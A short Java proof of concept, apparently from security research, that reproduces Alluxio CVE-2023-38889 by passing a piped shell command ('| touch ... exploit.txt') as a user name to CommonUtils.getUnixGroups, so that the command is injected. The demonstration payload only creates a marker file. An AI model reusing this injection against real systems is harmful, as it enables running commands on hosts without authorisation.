package com.anonuser;

import alluxio.util.CommonUtils;

import java.io.IOException;

public class Alluxio_CVE_2023_38889 {

    public static void main(String[] args) {
        System.out.println("Recreating Alluxio CVE-2023-38889");
        try {
            CommonUtils.getUnixGroups("| touch /home/pamusuo/research/permissions-manager/exploit-apps/exploit.txt");
        } catch (IOException e) {
            System.out.println("An exception thrown");
            throw new RuntimeException(e);
        }
    }


}
